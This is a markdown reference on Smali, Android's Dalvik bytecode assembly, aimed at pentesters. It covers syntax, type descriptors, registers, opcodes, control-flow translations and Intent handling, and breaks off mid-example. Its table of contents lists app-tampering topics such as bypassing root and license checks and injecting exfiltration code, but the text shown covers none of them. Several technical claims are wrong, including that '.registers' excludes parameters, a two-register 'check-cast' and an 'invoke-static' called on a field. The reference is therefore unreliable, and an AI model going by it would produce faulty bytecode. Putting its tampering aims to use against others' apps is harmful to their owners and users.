# 🧬 SMALI CODE - ULTIMATE REFERENCE FOR HACKERS

> 🔐 **The Most Comprehensive Smali Guide for Android Reverse Engineering, Exploitation & Security Research**  
> *Complete Dalvik bytecode reference, patterns, exploitation techniques, and real-world examples*

```
📊 Difficulty: 🟡 Intermediate → 🔴 Advanced
⏱️ Estimated Read: 90-120 min
🔄 Last Updated: 2026
🎯 Target: Pentesters, Reverse Engineers, Bug Bounty Hunters, Security Researchers
```

---

## 📋 MEGA TABLE OF CONTENTS

```
🔹 SECTION 1: SMALI FUNDAMENTALS
   1.1 What is Smali? Why It Matters for Hackers
   1.2 Smali vs Java vs Dalvik Bytecode
   1.3 File Structure & Organization
   1.4 Basic Syntax Rules

🔹 SECTION 2: TYPE SYSTEM & DESCRIPTORS
   2.1 Primitive Types
   2.2 Reference Types
   2.3 Array Types
   2.4 Method Signatures
   2.5 Field Signatures
   2.6 Generic Types & Annotations

🔹 SECTION 3: REGISTER & MEMORY MODEL
   3.1 Register Allocation (v0, v1, p0, p1)
   3.2 Wide Types (long/double) Register Rules
   3.3 Parameter Passing Conventions
   3.4 Local vs Instance vs Static Variables
   3.5 Stack vs Register Architecture

🔹 SECTION 4: COMPLETE INSTRUCTION REFERENCE (200+ OPCODES)
   4.1 Move Operations (move, move-object, move-wide)
   4.2 Constant Loading (const, const-string, const-class)
   4.3 Arithmetic Operations (add, sub, mul, div, rem)
   4.4 Bitwise Operations (and, or, xor, not, shl, shr, ushr)
   4.5 Comparison Operations (cmp, cmpl, cmpg, if-eq, if-ne, etc.)
   4.6 Branch & Control Flow (goto, packed-switch, sparse-switch)
   4.7 Array Operations (aget, aput, array-length, new-array)
   4.8 Object Operations (new-instance, iget, iput, sget, sput)
   4.9 Method Invocation (invoke-virtual, invoke-static, invoke-direct, etc.)
   4.10 Return Operations (return, return-object, return-wide, return-void)
   4.11 Exception Handling (try-catch, throw, monitored-enter/exit)
   4.12 Synchronization (monitor-enter, monitor-exit)
   4.13 Type Operations (instance-of, check-cast, new-instance)
   4.14 Data Conversion (int-to-long, float-to-int, etc.)
   4.15 Extended Instructions (fill-array-data, packed-switch-data)

🔹 SECTION 5: CONTROL FLOW & BRANCHING
   5.1 Conditional Branches Deep Dive
   5.2 Switch Statements (packed vs sparse)
   5.3 Loop Patterns in Smali
   5.4 Short-Circuit Evaluation Translation
   5.5 Exception Flow Control

🔹 SECTION 6: OBJECT-ORIENTED PATTERNS IN SMALI
   6.1 Class Definition Structure
   6.2 Field Declaration & Access
   6.3 Method Definition & Overloading
   6.4 Constructor Patterns (<init>, <clinit>)
   6.5 Inheritance & Interface Implementation
   6.6 Inner Classes & Anonymous Classes

🔹 SECTION 7: ANDROID-SPECIFIC PATTERNS
   7.1 Activity Lifecycle in Smali
   7.2 Intent Creation & Handling
   7.3 SharedPreferences Access
   7.4 SQLite Database Operations
   7.5 WebView & JavaScriptInterface
   7.6 Network Requests (OkHttp, HttpURLConnection)
   7.7 Cryptography Operations

🔹 SECTION 8: COMMON VULNERABILITY PATTERNS IN SMALI
   8.1 Hardcoded Credentials Detection
   8.2 Insecure Logging Patterns
   8.3 SQL Injection via String Concatenation
   8.4 Path Traversal in File Operations
   8.5 Intent Injection Vectors
   8.6 WebView JavaScriptInterface RCE
   8.7 Weak Cryptography Implementations
   8.8 SSL/TLS Misconfigurations

🔹 SECTION 9: SMALI MODIFICATION FOR EXPLOITATION
   9.1 Patching Conditional Checks
   9.2 Bypassing License/Root Detection
   9.3 Injecting Logging/Exfiltration Code
   9.4 Modifying API Endpoints
   9.5 Removing Certificate Pinning
   9.6 Privilege Escalation via Smali Edits
   9.7 Repackaging & Resigning APKs

🔹 SECTION 10: DECOMPILATION & RECONSTRUCTION
   10.1 Smali ↔ Java Mental Mapping
   10.2 Recognizing Obfuscation Patterns
   10.3 Reconstructing Logic from Smali
   10.4 Handling ProGuard/R8 Obfuscation
   10.5 Native Code (.so) Integration Points

🔹 SECTION 11: DYNAMIC ANALYSIS & HOOKING
   11.1 Frida Scripts for Smali Method Hooking
   11.2 Xposed Module Development Basics
   11.3 Runtime Smali Injection Techniques
   11.4 Tracing Execution Flow Dynamically

🔹 SECTION 12: TOOLS ARSENAL
   12.1 Apktool (Decode/Build)
   12.2 jadx (Java Decompilation)
   12.3 baksmali/smali (CLI Tools)
   12.4 JEB/Ghidra (Interactive Analysis)
   12.5 VS Code Extensions for Smali
   12.6 Custom Scripts & Automation

🔹 SECTION 13: QUICK REFERENCE TABLES
   13.1 Complete Opcode Table (Alphabetical)
   13.2 Opcode Table (By Category)
   13.3 Type Descriptor Cheat Sheet
   13.4 Register Convention Summary
   13.5 Common Pattern Snippets

🔹 SECTION 14: REAL-WORLD EXAMPLES
   14.1 Example 1: Bypassing Root Detection
   14.2 Example 2: Extracting Hardcoded API Key
   14.3 Example 3: Modifying License Check
   14.4 Example 4: Injecting Proxy for MITM
   14.5 Example 5: Privilege Escalation via Exported Component

🔹 SECTION 15: TROUBLESHOOTING & DEBUGGING
   15.1 Common Smali Errors & Fixes
   15.2 Debugging Repackaged APKs
   15.3 Handling Verification Errors
   15.4 Performance Considerations

🔹 SECTION 16: REFERENCES & FURTHER LEARNING
```

---

## 🔹 SECTION 1: SMALI FUNDAMENTALS

### 1.1 What is Smali? Why It Matters for Hackers

**Smali** is the human-readable assembly language for Android's **Dalvik/ART runtime**. It's the decompiled form of `.dex` (Dalvik Executable) files found inside APKs.

```
Java/Kotlin Source → javac/kotlinc → .class → D8/R8 → classes.dex → Smali (via apktool)
```

**Why Hackers Care About Smali:**
```
✅ See EXACTLY what the app does (no source obfuscation at bytecode level)
✅ Modify app behavior by editing Smali (bypass checks, inject code)
✅ Understand security controls at the lowest practical level
✅ Find vulnerabilities that decompilers might miss
✅ Create targeted Frida hooks by knowing exact method signatures
✅ Repackage apps with custom payloads
```

### 1.2 Smali vs Java vs Dalvik Bytecode

| Aspect | Java Source | Smali | Dalvik Bytecode |
|--------|------------|-------|----------------|
| **Readability** | Human-friendly | Assembly-like | Binary hex |
| **Purpose** | Development | Reverse Engineering | Execution |
| **Abstraction** | High (OOP, generics) | Medium (registers, opcodes) | Low (instructions) |
| **Modification** | Edit & recompile | Edit & reassemble | Hex edit (hard) |
| **Tool** | IDE (Android Studio) | apktool, baksmali | dex2jar, jadx |

### 1.3 Smali File Structure

```smali
# File: smali/com/example/app/MainActivity.smali

# 1. Class header
.class public Lcom/example/app/MainActivity;
.super Landroidx/appcompat/app/AppCompatActivity;  # Parent class
.source "MainActivity.java"                          # Original source file

# 2. Interfaces implemented
.implements Landroid/view/View$OnClickListener;

# 3. Annotations (metadata)
.annotation runtime Lkotlin/Metadata;
    mv = {1, 7, 1}
    k = 0x1
.end annotation

# 4. Fields (class variables)
.field private apiKey:Ljava/lang/String;  # Private String field
.field public static final TAG:Ljava/lang/String; = "MyApp"  # Constant

# 5. Direct methods (static, private, constructors)
.method static constructor <clinit>()V
    .registers 1
    const-string v0, "MyApp"
    sput-object v0, Lcom/example/app/MainActivity;->TAG:Ljava/lang/String;
    return-void
.end method

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroidx/appcompat/app/AppCompatActivity;-><init>()V
    return-void
.end method

# 6. Virtual methods (instance methods)
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 3
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;
    
    invoke-super {p0, p1}, Landroidx/appcompat/app/AppCompatActivity;->onCreate(Landroid/os/Bundle;)V
    const v0, 0x7f0b0025
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->setContentView(I)V
    
    # Find button and set click listener
    const v1, 0x7f0900ab
    invoke-virtual {p0, v1}, Lcom/example/app/MainActivity;->findViewById(I)Landroid/view/View;
    move-result-object v2
    check-cast v2, Landroid/widget/Button;
    invoke-virtual {v2, p0}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V
    
    return-void
.end method

# 7. Interface method implementation
.method public onClick(Landroid/view/View;)V
    .registers 2
    .param p1, "v"    # Landroid/view/View;
    
    # Get text from EditText
    const v0, 0x7f0900cd
    invoke-virtual {p0, v0}, Lcom/example/app/MainActivity;->findViewById(I)Landroid/view/View;
    move-result-object v0
    check-cast v0, Landroid/widget/EditText;
    invoke-virtual {v0}, Landroid/widget/EditText;->getText()Landroid/text/Editable;
    move-result-object v0
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v0
    
    # Call API with input
    invoke-direct {p0, v0}, Lcom/example/app/MainActivity;->callApi(Ljava/lang/String;)V
    
    return-void
.end method
```

### 1.4 Basic Syntax Rules

```smali
# Comments start with #
# Each instruction is one line

# Register naming:
v0, v1, v2...     # Local registers (0-65535 theoretically, limited by .registers)
p0, p1, p2...     # Parameter registers (p0 = 'this' for instance methods)

# Method signature format:
.method [flags] methodName(parameterTypes)returnType

# Field reference format:
Lpackage/Class;->fieldName:FieldType

# Type descriptors:
Z = boolean    B = byte    S = short    C = char
I = int        J = long    F = float    D = double
V = void       L...; = object    [ = array

# Example: String method signature
# Java: String.substring(int, int):String
# Smali: substring(II)Ljava/lang/String;

# Labels for branching:
:label_name
goto :label_name
if-eq v0, v1, :label_name
```

---

## 🔹 SECTION 2: TYPE SYSTEM & DESCRIPTORS

### 2.1 Primitive Types

| Java Type | Smali Descriptor | Size | Notes |
|-----------|-----------------|------|-------|
| `boolean` | `Z` | 32-bit (internally) | 0=false, 1=true |
| `byte` | `B` | 8-bit signed | |
| `short` | `S` | 16-bit signed | |
| `char` | `C` | 16-bit unsigned | UTF-16 code unit |
| `int` | `I` | 32-bit signed | Most common |
| `long` | `J` | 64-bit signed | Uses 2 registers (wide) |
| `float` | `F` | 32-bit IEEE 754 | |
| `double` | `D` | 64-bit IEEE 754 | Uses 2 registers (wide) |
| `void` | `V` | N/A | Return type only |

### 2.2 Reference Types

```smali
# Class reference: L fully/qualified/ClassName;
Ljava/lang/String;           # java.lang.String
Landroid/widget/Button;      # android.widget.Button
Lcom/example/app/MainActivity;  # Your app's class

# Important: Forward slashes, not dots!
# Ends with semicolon!
```

### 2.3 Array Types

```smali
# Array syntax: [DimensionType
[Z          # boolean[]
[[I         # int[][] (2D array)
[Ljava/lang/String;  # String[]
[[Lcom/example/Data; # Data[][]

# Array access in Smali:
aget-object v1, v0, v2    # v1 = v0[v2] (object array)
aget v1, v0, v2           # v1 = v0[v2] (primitive array)
aput-object v1, v0, v2    # v0[v2] = v1 (object array)
aput v1, v0, v2           # v0[v2] = v1 (primitive array)
array-length v1, v0       # v1 = v0.length
```

### 2.4 Method Signatures

```smali
# Format: (ParameterTypes)ReturnType

# Java: void onClick(View v)
# Smali: onClick(Landroid/view/View;)V

# Java: String getUser(int id, boolean active)
# Smali: getUser(IZ)Ljava/lang/String;

# Java: int[] process(byte[] data, String key)
# Smali: process([BLjava/lang/String;)[I

# Java: <T> T parse(String json, Class<T> clazz)
# Smali: parse(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;
# (Generics erased at runtime)

# Constructor signatures:
<init>    # Instance constructor
<clinit>  # Static initializer (class loading)

# Example constructor:
.method public constructor <init>(Ljava/lang/String;I)V
# Java equivalent: public MyClass(String name, int value)
```

### 2.5 Field Signatures

```smali
# Format: fieldName:FieldType

# Java: private String apiKey;
# Smali: .field private apiKey:Ljava/lang/String;

# Java: public static final int VERSION = 1;
# Smali: .field public static final VERSION:I = 0x1

# Accessing fields:
# Instance field: Lcom/example/App;->apiKey:Ljava/lang/String;
# Static field: Lcom/example/Config;->API_URL:Ljava/lang/String;

# Get/Set operations:
iget-object v1, v0, Lcom/example/App;->apiKey:Ljava/lang/String;  # v1 = this.apiKey
iput-object v1, v0, Lcom/example/App;->apiKey:Ljava/lang/String;  # this.apiKey = v1
sget-object v1, Lcom/example/Config;->API_URL:Ljava/lang/String;  # v1 = Config.API_URL
sput-object v1, Lcom/example/Config;->API_URL:Ljava/lang/String;  # Config.API_URL = v1
```

### 2.6 Generic Types & Annotations

```smali
# Generics are erased - appear as Object
# Java: List<String> items;
# Smali: .field items:Ljava/util/List;  # No <String> visible

# Annotations in Smali:
.annotation runtime Ljavax/annotation/Nullable;
.end annotation

.annotation system Ldalvik/annotation/Signature;
    value = {
        "Ljava/util/List<",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation

# Runtime annotations can be inspected via reflection
# System annotations often stripped in release builds
```

---

## 🔹 SECTION 3: REGISTER & MEMORY MODEL

### 3.1 Register Allocation

```smali
# Registers are named v0, v1, v2... (local) and p0, p1, p2... (parameters)

# .registers directive declares how many LOCAL registers a method uses
# Parameters are ADDITIONAL and don't count toward this number

.method public example(II)V
    .registers 3    # Declares 3 LOCAL registers (v0, v1, v2)
    # Parameters: p0=this, p1=first int, p2=second int
    # Total available: v0-v2 + p0-p2
    
    move/from16 v0, p1    # Copy parameter to local
    add-int v0, v0, p2    # v0 = p1 + p2
    return-void
.end method

# Parameter register assignment:
# Instance method: p0=this, p1=param1, p2=param2...
# Static method: p0=param1, p1=param2... (no 'this')

# Wide types (long/double) use TWO registers:
.method wideExample(J)D
    .registers 4    # v0-v3 for locals
    # p0=this, p1-p2=long param (uses 2 regs), return uses 2 regs
    return-wide p1  # Return the long value
.end method
```

### 3.2 Wide Types Register Rules

```smali
# long (J) and double (D) are "wide" types occupying 2 registers

# Loading wide constants:
const-wide v0, 0x1234567890abcdefL  # v0+v1 hold the 64-bit value

# Moving wide values:
move-wide v2, v0    # Copies v0+v1 to v2+v3 (4 registers involved)

# Arithmetic with wide types:
add-long v0, v2, v4  # v0+v1 = (v2+v3) + (v4+v5)

# ⚠️ Common mistake: Forgetting wide types use 2 registers
# This causes "register out of range" errors when repackaging
```

### 3.3 Parameter Passing Conventions

```smali
# Instance method call:
# Java: obj.method(arg1, arg2)
# Smali:
invoke-virtual {v0, v1, v2}, Lcom/example/Class;->method(LType1;Type2;)ReturnType
#          ↑    ↑    ↑
#        this  arg1 arg2

# Static method call:
# Java: Class.staticMethod(arg1, arg2)
# Smali:
invoke-static {v0, v1}, Lcom/example/Class;->staticMethod(LType1;Type2;)ReturnType
#                 ↑    ↑
#               arg1  arg2  (no 'this')

# Direct (constructor/super) call:
invoke-direct {v0}, Ljava/lang/Object;-><init>()V  # super()
invoke-direct {v0, v1}, Lcom/example/Class;-><init>(I)V  # new Class(42)

# Interface call:
invoke-interface {v0}, Ljava/lang/Runnable;->run()V

# Virtual vs Super call:
invoke-virtual {v0}, Lcom/example/Child;->method()V  # Dynamic dispatch
invoke-super {v0}, Lcom/example/Parent;->method()V   # Call parent implementation
```

### 3.4 Variable Scopes

```smali
# Local variables (.registers scope)
.method localVars()V
    .registers 2
    const/4 v0, 5      # v0 = 5 (local)
    const/4 v1, 10     # v1 = 10 (local)
    # v0, v1 destroyed when method returns
    return-void
.end method

# Instance fields (persist with object)
.field private counter:I  # Lives as long as object exists

# Accessing instance field:
iget v1, p0, Lcom/example/App;->counter:I  # v1 = this.counter
iput v1, p0, Lcom/example/App;->counter:I  # this.counter = v1

# Static fields (persist with class)
.field public static instance:Lcom/example/Singleton;

# Accessing static field:
sget-object v0, Lcom/example/Singleton;->instance:Lcom/example/Singleton;
sput-object v1, Lcom/example/Singleton;->instance:Lcom/example/Singleton;
```

### 3.5 Stack vs Register Architecture

**Important**: Dalvik is REGISTER-BASED, not stack-based like JVM.

```smali
# JVM (stack-based) - for comparison:
# Java: int result = a + b;
# Bytecode:
#   iload_1      # push a
#   iload_2      # push b  
#   iadd         # pop both, push result
#   istore_3     # pop result to local

# Dalvik (register-based):
# Smali:
add-int v3, v1, v2  # v3 = v1 + v2 (all explicit registers)

# Advantages for reverse engineering:
✅ Clear data flow (no implicit stack operations)
✅ Easier to track register values
✅ More predictable for instrumentation
```

---

## 🔹 SECTION 4: COMPLETE INSTRUCTION REFERENCE

### 4.1 Move Operations

| Opcode | Format | Description | Example |
|--------|--------|-------------|---------|
| `move` | `move vx, vy` | Copy 32-bit value | `move v1, v0` |
| `move/from16` | `move/from16 vx, vy` | Copy with 16-bit register index | `move/from16 v0, p1` |
| `move/16` | `move/16 vx, vy` | Copy with 16-bit indices for both | `move/16 v255, v0` |
| `move-wide` | `move-wide vx, vy` | Copy 64-bit value (2 regs) | `move-wide v0, v2` |
| `move-wide/from16` | `move-wide/from16 vx, vy` | Copy wide with 16-bit index | `move-wide/from16 v0, p1` |
| `move-object` | `move-object vx, vy` | Copy object reference | `move-object v1, v0` |
| `move-object/from16` | `move-object/from16 vx, vy` | Copy object with 16-bit index | `move-object/from16 v0, p0` |
| `move-result` | `move-result vx` | Get result from method call | `invoke-virtual {...}; move-result v0` |
| `move-result-wide` | `move-result-wide vx` | Get wide result | `invoke-static {...}; move-result-wide v0` |
| `move-result-object` | `move-result-object vx` | Get object result | `invoke-virtual {...}; move-result-object v0` |
| `move-exception` | `move-exception vx` | Get caught exception object | `catch :label; move-exception v0` |

### 4.2 Constant Loading

| Opcode | Format | Description | Example |
|--------|--------|-------------|---------|
| `const/4` | `const/4 vx, lit4` | Load 4-bit constant (-8 to 7) | `const/4 v0, 0x1` |
| `const/16` | `const/16 vx, lit16` | Load 16-bit constant | `const/16 v0, 0x1234` |
| `const` | `const vx, lit32` | Load 32-bit constant | `const v0, 0x12345678` |
| `const/high16` | `const/high16 vx, lit16` | Load float with high 16 bits | `const/high16 v0, 0x3f80` (1.0f) |
| `const-wide/16` | `const-wide/16 vx, lit16` | Load 16-bit into wide | `const-wide/16 v0, 0x1234` |
| `const-wide/32` | `const-wide/32 vx, lit32` | Load 32-bit into wide | `const-wide/32 v0, 0x12345678` |
| `const-wide` | `const-wide vx, lit64` | Load 64-bit constant | `const-wide v0, 0x1234567890abcdef` |
| `const-wide/high16` | `const-wide/high16 vx, lit16` | Load double with high 16 bits | `const-wide/high16 v0, 0x3ff0` (1.0) |
| `const-string` | `const-string vx, string_id` | Load string from pool | `const-string v0, "Hello"` |
| `const-string-jumbo` | `const-string-jumbo vx, string_id` | Load string with 32-bit index | (rare, for huge string pools) |
| `const-class` | `const-class vx, type_id` | Load Class object | `const-class v0, Ljava/lang/String;` |

### 4.3 Arithmetic Operations

#### Integer Arithmetic
```smali
add-int v0, v1, v2          # v0 = v1 + v2
sub-int v0, v1, v2          # v0 = v1 - v2
mul-int v0, v1, v2          # v0 = v1 * v2
div-int v0, v1, v2          # v0 = v1 / v2 (truncates toward zero)
rem-int v0, v1, v2          # v0 = v1 % v2

# With literal operand (more efficient)
add-int/lit8 v0, v1, lit8   # v0 = v1 + 8-bit literal
add-int/lit16 v0, v1, lit16 # v0 = v1 + 16-bit literal
rsub-int v0, v1, lit16      # v0 = lit16 - v1 (reverse subtract)
mul-int/lit8 v0, v1, lit8   # v0 = v1 * 8-bit literal

# Bitwise operations
and-int v0, v1, v2          # v0 = v1 & v2
or-int v0, v1, v2           # v0 = v1 | v2
xor-int v0, v1, v2          # v0 = v1 ^ v2
not-int v0, v1              # v0 = ~v1

# Shift operations
shl-int v0, v1, v2          # v0 = v1 << v2
shr-int v0, v1, v2          # v0 = v1 >> v2 (arithmetic/sign-extending)
ushr-int v0, v1, v2         # v0 = v1 >>> v2 (logical/zero-extending)

# With literal shifts
shl-int/lit8 v0, v1, lit8   # v0 = v1 << 8-bit literal
```

#### Long (64-bit) Arithmetic
```smali
add-long v0, v2, v4         # v0+v1 = (v2+v3) + (v4+v5)
sub-long v0, v2, v4
mul-long v0, v2, v4
div-long v0, v2, v4
rem-long v0, v2, v4

# Note: No literal variants for long ops (use const-wide + regular op)
```

#### Float/Double Arithmetic
```smali
# Float (32-bit)
add-float v0, v1, v2
sub-float v0, v1, v2
mul-float v0, v1, v2
div-float v0, v1, v2
rem-float v0, v1, v2

# Double (64-bit) - uses pairs of registers
add-double v0, v2, v4
sub-double v0, v2, v4
# ... etc

# Negation
neg-int v0, v1              # v0 = -v1
neg-long v0, v2             # v0+v1 = -(v2+v3)
neg-float v0, v1
neg-double v0, v2
```

### 4.4 Comparison Operations

```smali
# Compare two values, result in int register:
# result = (a == b) ? 0 : (a < b) ? -1 : 1

cmp-long v0, v2, v4         # Compare longs: v0 = compare(v2+v3, v4+v5)
cmpl-float v0, v1, v2       # Compare floats (NaN < anything)
cmpg-float v0, v1, v2       # Compare floats (NaN > anything)
cmpl-double v0, v2, v4      # Compare doubles (NaN < anything)
cmpg-double v0, v2, v4      # Compare doubles (NaN > anything)

# Conditional branches (all 32-bit int comparisons):
if-eq vx, vy, :label        # Branch if vx == vy
if-ne vx, vy, :label        # Branch if vx != vy
if-lt vx, vy, :label        # Branch if vx < vy (signed)
if-ge vx, vy, :label        # Branch if vx >= vy
if-gt vx, vy, :label        # Branch if vx > vy
if-le vx, vy, :label        # Branch if vx <= vy

# Compare with zero (more efficient):
if-eqz vx, :label           # Branch if vx == 0
if-nez vx, :label           # Branch if vx != 0
if-ltz vx, :label           # Branch if vx < 0
if-gez vx, :label           # Branch if vx >= 0
if-gtz vx, :label           # Branch if vx > 0
if-lez vx, :label           # Branch if vx <= 0
```

### 4.5 Branch & Control Flow

```smali
# Unconditional branch
goto :label
goto/16 :label              # For distant labels (16-bit offset)
goto/32 :label              # For very distant labels (32-bit offset)

# Computed goto (like switch dispatch table)
packed-switch v0, :pswitch_data
sparse-switch v0, :sswitch_data

# Switch data definitions (MUST be at end of method):
.packed-switch 0x0          # Cases: 0, 1, 2, 3... (sequential)
    :case_0
    :case_1
    :case_2
    :case_3
.end packed-switch

.sparse-switch              # Cases: arbitrary values
    0x10 -> :case_hex10
    0x20 -> :case_hex20
    0x100 -> :case_hex100
.end sparse-switch

# Label syntax:
:my_label                   # Define label
goto :my_label              # Jump to label

# Labels can contain: letters, digits, underscore, hyphen
# Must start with letter or underscore
```

### 4.6 Array Operations

```smali
# Create array:
new-array v0, v1, [I        # v0 = new int[v1]
new-array v0, v1, [Ljava/lang/String;  # v0 = new String[v1]

# Read from array:
aget v0, v1, v2             # v0 = ((int[])v1)[v2]
aget-object v0, v1, v2      # v0 = ((Object[])v1)[v2]
aget-wide v0, v2, v4        # v0+v1 = ((long[])v2)[v4]
aget-boolean v0, v1, v2     # v0 = ((boolean[])v1)[v2]
# ... aget-byte, aget-char, aget-short, aget-float, aget-double

# Write to array:
aput v0, v1, v2             # ((int[])v1)[v2] = v0
aput-object v0, v1, v2      # ((Object[])v1)[v2] = v0
# ... aput-wide, aput-boolean, etc.

# Array length:
array-length v0, v1         # v0 = ((array)v1).length

# Fill array with data (static data section):
fill-array-data v0, :array_data

:array_data
    .array-data 4           # 4 = element size in bytes (int=4)
        0x00000001
        0x00000002
        0x00000003
    .end array-data
```

### 4.7 Object Operations

```smali
# Create new instance:
new-instance v0, Ljava/lang/StringBuilder;  # v0 = new StringBuilder()

# Access instance fields:
iget v1, v0, Lcom/example/User;->age:I          # v1 = user.age
iget-object v1, v0, Lcom/example/User;->name:Ljava/lang/String;  # v1 = user.name
iget-wide v1, v3, Lcom/example/Data;->timestamp:J  # v1+v2 = data.timestamp

iput v1, v0, Lcom/example/User;->age:I          # user.age = v1
iput-object v1, v0, Lcom/example/User;->name:Ljava/lang/String;  # user.name = v1

# Access static fields:
sget v0, Lcom/example/Config;->MAX_RETRY:I          # v0 = Config.MAX_RETRY
sget-object v0, Lcom/example/Config;->API_URL:Ljava/lang/String;

sput v1, Lcom/example/Config;->MAX_RETRY:I          # Config.MAX_RETRY = v1
sput-object v1, Lcom/example/Config;->API_URL:Ljava/lang/String;

# Type checking & casting:
instance-of v0, v1, Ljava/lang/String;  # v0 = (v1 instanceof String) ? 1 : 0
check-cast v0, v1, Ljava/lang/String;   # v0 = (String)v1; throws ClassCastException if fail

# Monitor (synchronized) operations:
monitor-enter v0              # synchronized(v0) {
monitor-exit v0               # }
```

### 4.8 Method Invocation (CRITICAL FOR HOOKING)

```smali
# invoke-virtual: Instance method with dynamic dispatch
invoke-virtual {v0, v1, v2}, Lcom/example/Class;->method(LType1;)V
# v0 = this, v1 = arg1, method returns void

# invoke-super: Call parent class implementation
invoke-super {v0, v1}, Lcom/example/Parent;->onCreate(Landroid/os/Bundle;)V

# invoke-direct: Constructor or private method (no dynamic dispatch)
invoke-direct {v0}, Ljava/lang/Object;-><init>()V  # super()
invoke-direct {v0, v1}, Lcom/example/Class;-><init>(I)V  # new Class(42)
invoke-direct {v0}, Lcom/example/Class;->privateMethod()V

# invoke-static: Static method call
invoke-static {v0, v1}, Ljava/lang/System;->out:Ljava/io/PrintStream;
invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

# invoke-interface: Interface method call
invoke-interface {v0}, Ljava/lang/Runnable;->run()V

# invoke-polymorphic: Method handle invocation (Android 7.0+, rare)
invoke-polymorphic {...}, Ljava/lang/invoke/MethodHandle;->invokeExact(...)

# invoke-custom: Lambda/invokedynamic support (Android 8.0+, rare)

# Getting return values:
invoke-virtual {v0}, Lcom/example/Calc;->getResult()I
move-result v1              # v1 = result

invoke-static {v0}, Lcom/example/Util;->getLongData()J
move-result-wide v1         # v1+v2 = result

invoke-virtual {v0}, Lcom/example/Factory;->createObject()Ljava/lang/Object;
move-result-object v1       # v1 = result object
```

### 4.9 Return Operations

```smali
return-void                 # Return from void method
return v0                   # Return 32-bit value (int, float, etc.)
return-wide v0              # Return 64-bit value (long, double) - v0+v1
return-object v0            # Return object reference

# Must match method signature return type!
```

### 4.10 Exception Handling

```smali
# Try-catch structure:
.try-start :try_start
.try-end :try_end
.catch Ljava/lang/Exception; {:try_start .. :try_end} :catch_handler

# Or inline syntax:
:try_start
    # Protected code
    invoke-virtual {v0}, Lcom/example/Risky;->doSomething()V
    goto :try_success

:catch_handler
    move-exception v0       # v0 = caught exception object
    # Handle exception
    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V
    goto :method_end

:try_success
    # Continue normal flow
    ...

:method_end
    return-void

# Multiple catch blocks:
.catch Ljava/io/IOException; {:try_start .. :try_end} :catch_io
.catch Ljava/lang/SecurityException; {:try_start .. :try_end} :catch_security

# Throw exception:
throw v0                    # throw (Exception)v0

# Create and throw in one go:
new-instance v0, Ljava/lang/IllegalArgumentException;
const-string v1, "Invalid argument"
invoke-direct {v0, v1}, Ljava/lang/IllegalArgumentException;-><init>(Ljava/lang/String;)V
throw v0
```

### 4.11 Extended Instructions

```smali
# Fill array with static data:
fill-array-data v0, :data_array

:data_array
    .array-data 1           # byte array (1 byte per element)
        0x48 0x65 0x6c 0x6c 0x6f  # "Hello"
    .end array-data

# Packed switch data:
.packed-switch 10           # First case value
    :case_10                # case 10:
    :case_11                # case 11:
    :case_12                # case 12:
.end packed-switch

# Sparse switch data:
.sparse-switch
    0x1 -> :case_1
    0x10 -> :case_16
    0x100 -> :case_256
.end sparse-switch

# Annotation for debugging (stripped in release):
.param p1, "userName"    # Ljava/lang/String;
.local v0, "processedName"    # Ljava/lang/String;
.end local
```

---

## 🔹 SECTION 5: CONTROL FLOW PATTERNS

### 5.1 If-Else Translation

```java
// Java
if (user.isActive()) {
    showDashboard();
} else {
    showLogin();
}
```

```smali
# Smali
invoke-virtual {v0}, Lcom/example/User;->isActive()Z
move-result v1
if-eqz v1, :else_block    # if (!isActive) goto else

# if-block
invoke-virtual {p0}, Lcom/example/App;->showDashboard()V
goto :end_if

:else_block
invoke-virtual {p0}, Lcom/example/App;->showLogin()V

:end_if
return-void
```

### 5.2 Loop Patterns

#### For Loop
```java
// Java
for (int i = 0; i < 10; i++) {
    process(i);
}
```

```smali
# Smali
const/4 v0, 0          # i = 0
:loop_start
const/16 v1, 10
if-ge v0, v1, :loop_end  # if (i >= 10) goto end

# Loop body
invoke-virtual {p0, v0}, Lcom/example/App;->process(I)V

# Increment & repeat
add-int/lit8 v0, v0, 1   # i++
goto :loop_start

:loop_end
return-void
```

#### While Loop
```java
// Java
while (hasMoreData()) {
    Data d = readNext();
    process(d);
}
```

```smali
# Smali
:while_start
invoke-virtual {p0}, Lcom/example/App;->hasMoreData()Z
move-result v0
if-eqz v0, :while_end    # if (!hasMoreData) break

invoke-virtual {p0}, Lcom/example/App;->readNext()Lcom/example/Data;
move-result-object v0
invoke-virtual {p0, v0}, Lcom/example/App;->process(Lcom/example/Data;)V
goto :while_start

:while_end
return-void
```

### 5.3 Switch Statement

```java
// Java
switch (status) {
    case 1: handleActive(); break;
    case 2: handlePending(); break;
    default: handleUnknown();
}
```

```smali
# Smali (packed switch for sequential values)
invoke-virtual {v0}, Lcom/example/Order;->getStatus()I
move-result v1
packed-switch v1, :status_switch

:case_1
invoke-virtual {p0}, Lcom/example/App;->handleActive()V
goto :switch_end

:case_2
invoke-virtual {p0}, Lcom/example/App;->handlePending()V
goto :switch_end

:case_default
invoke-virtual {p0}, Lcom/example/App;->handleUnknown()V
goto :switch_end

:status_switch
.packed-switch 1
    :case_1
    :case_2
.end packed-switch

:switch_end
return-void
```

---

## 🔹 SECTION 6: ANDROID-SPECIFIC PATTERNS

### 6.1 Intent Creation & Handling

```smali
# Create explicit Intent
new-instance v0, Landroid/content/Intent;
const-class v1, Lcom/example/TargetActivity;
invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

# Add extras
const-string v1, "user_id"
const/16 v2, 12345
invoke-virtual {v0, v1, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

# Start activity
invoke-virtual {p0, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

# Read Intent extras (in target Activity)
invoke-virtual {p0}, Landroid/app/Activity;->getIntent()Landroid/content/Intent;
move-result-object v0
const-string v1, "user_id"
invoke-virtual {v0, v1, p1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I  # p1 = default
